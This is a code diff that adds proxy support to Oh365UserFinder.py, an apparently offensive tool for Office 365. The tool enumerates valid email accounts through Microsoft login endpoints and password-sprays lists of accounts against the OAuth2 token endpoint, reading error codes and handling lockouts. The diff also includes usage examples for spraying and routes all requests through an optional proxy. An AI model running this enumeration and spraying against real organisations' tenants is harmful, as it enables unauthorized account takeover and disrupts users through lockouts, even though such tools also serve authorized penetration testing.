@@ -63,11 +63,12 @@ python3 Oh365UserFinder.py -r testemails.txt -w valid.txt\n
 python3 Oh365UserFinder.py -r emails.txt -w validemails.txt -t 30\n
 ---Validate a list of emails and write to CSV---
 python3 Oh365UserFinder.py -r emails.txt -c validemails.csv -t 30\n
----Password Spray a list of emails using GRAPH--- (Can be used to identify valid account credentials with MFA enabled)
+---Password Spray a list of emails using GRAPH---
 python3 Oh365UserFinder.py -p <password> --pwspray --elist <listname>\n
 ---Password Spray a list of emails using GRAPH with lockout policy timer---
 python3 Oh365UserFinder.py -p <password> --pwspray --elist <listname> --lockout <time>\n
-
+---Use a proxy for requests---
+python3 Oh365UserFinder.py --proxy http://proxy:port -e test@test.com\n
 """
         ),
     )
@@ -93,11 +94,11 @@ python3 Oh365UserFinder.py -p <password> --pwspray --elist <listname> --lockout 
     opt_parser.add_argument(
         "-l", "--lockout", help="Sets the lockout timer if known (in minutes)"
     )
-
-    # opt_parser.add_argument(
-    #     '-ps', '--pwspray', help='Password sprays a list of accounts using RST', action='store_true')
     opt_parser.add_argument("-p", "--password", help="Password to be tested")
     opt_parser.add_argument("-el", "--elist", help="Valid emails to be tested")
+    opt_parser.add_argument(
+        "--proxy", help="Use a proxy for requests (e.g., http://proxy:port)"
+    )
     global args
     args = opt_parser.parse_args()
     if len(sys.argv) == 1:
@@ -106,6 +107,19 @@ python3 Oh365UserFinder.py -p <password> --pwspray --elist <listname> --lockout 
 
 
 ms_url = "https://login.microsoftonline.com/common/GetCredentialType"
+
+
+def create_session():
+    """Create a requests session with optional proxy configuration."""
+    session = o365request.Session()
+    if args.proxy:
+        proxies = {
+            "http": args.proxy,
+            "https": args.proxy,
+        }
+        session.proxies.update(proxies)
+        print(info + f"[info] Using proxy: {args.proxy}" + close)
+    return session
 
 
 def main():
@@ -125,9 +139,9 @@ def main():
     )
     if args.email is not None:
         email = args.email
-        s = o365request.session()
+        s = create_session()
         body = '{"Username":"%s"}' % email
-        request = o365request.post(ms_url, data=body)
+        request = s.post(ms_url, data=body)
         response_dict = request.json()
         response = request.text
         valid_response = re.search('"IfExistsResult":0,', response)
@@ -185,11 +199,11 @@ def main():
     elif args.read is not None:
         with open(args.read) as input_emails:
             for line in input_emails:
-                s = o365request.session()
+                s = create_session()
                 email_line = line.split()
                 email = " ".join(email_line)
                 body = '{"Username":"%s"}' % email
-                request = o365request.post(ms_url, data=body)
+                request = s.post(ms_url, data=body)
                 response = request.text
                 valid_response = re.search('"IfExistsResult":0,', response)
                 valid_response5 = re.search('"IfExistsResult":5,', response)
@@ -259,14 +273,12 @@ def main():
                             print(info + f"\nContinuing scan in 30 seconds.")
                             time.sleep(int(30))
                             timeout_counter = 0
-                            # sys.exit()
                         else:
                             print(
                                 fail
                                 + f"\n[warn] Results suggest O365 is responding with false positives. Sleeping for {args.timeout} seconds before trying again.\n"
                             )
                             time.sleep(int(args.timeout))
-
                     else:
                         print(
                             fail
@@ -298,10 +310,9 @@ def main():
         domain_name = args.domain
         print(info + f"[info] Checking if the {domain_name} exists...\n" + close)
         url = f"https://login.microsoftonline.com/getuserrealm.srf?login=user@{domain_name}"
-        request = o365request.get(url)
-        # print(request)
+        s = create_session()
+        request = s.get(url)
         response = request.text
-        # print(response)
         valid_response = re.search('"NameSpaceType":"Managed",', response)
         valid_response1 = re.search('"NameSpaceType":"Federated",', response)
         if args.verbose:
@@ -324,7 +335,7 @@ def main():
                 + f"[info] The listed domain {domain_name} does not exist.\n"
                 + close
             )
-        print(info + f"[info] Scan completed at {time.ctime()}" + close)
+        print(info + f"\n[info] Scan completed at {time.ctime()}" + close)
     elif args.pwspray:
         lockout_counter = 0
         with open(args.elist) as input_emails:
@@ -332,7 +343,7 @@ def main():
                 email_line = line.split()
                 email = " ".join(email_line)
                 password = args.password
-                s = o365request.session()
+                s = create_session()
                 body = (
                     "grant_type=password&password="
                     + password
@@ -341,7 +352,7 @@ def main():
                     + "&resource=https://graph.windows.net&client_info=1&scope=openid"
                 )
                 requestURL = "https://login.microsoft.com/common/oauth2/token"
-                request = o365request.post(requestURL, data=body)
+                request = s.post(requestURL, data=body)
                 response = request.text
                 valid_response = re.search("53003", response)
                 account_doesnt_exist = re.search("50034", response)
@@ -398,18 +409,6 @@ def main():
                     b = "Result - " + " " * 13 + "LOCKOUT DETECTED! [!]"
                     print(info + f"[!] {email:44} {b}" + close)
                     lockout_counter = lockout_counter + 1
-                    # if args.lockout:
-                    #     lock_time = args.lockout
-                    #     lockout = int(lock_time)
-                    # if args.lockout is None:
-                    #     lock_time = 1
-                    #     lockout = int(lock_time) * 60
-                    # if lockout_counter == 3:
-                    #     print(fail + f'\n[warn] Multiple lockouts detected.\n')
-                    #     print(info + f"Waiting {lockout} seconds before continuing.")
-                    #     time.sleep(int(lockout))
-                    #     timeout_counter = 0
-                    #     lockout_counter = 0
                     if lockout_counter >= 3:
                         print(info + "[!] Warning - three lockouts detected.\n" + close)
                         lockout_answer = input(
@@ -423,7 +422,6 @@ def main():
                         else:
                             lockout_counter = 0
                             continue
-
                 if desktopsso_response:
                     a = email
                     b = " Result -  Desktop SSO Enabled [!]"
@@ -490,4 +488,7 @@ if __name__ == "__main__":
 
     except KeyboardInterrupt:
         print("\nYou either fat fingered this, or meant to do it. Either way, goodbye!")
+        quit()
+    except o365request.exceptions.ProxyError:
+        print(fail + "\n[error] Proxy connection failed. Please check the proxy settings." + close)
         quit()
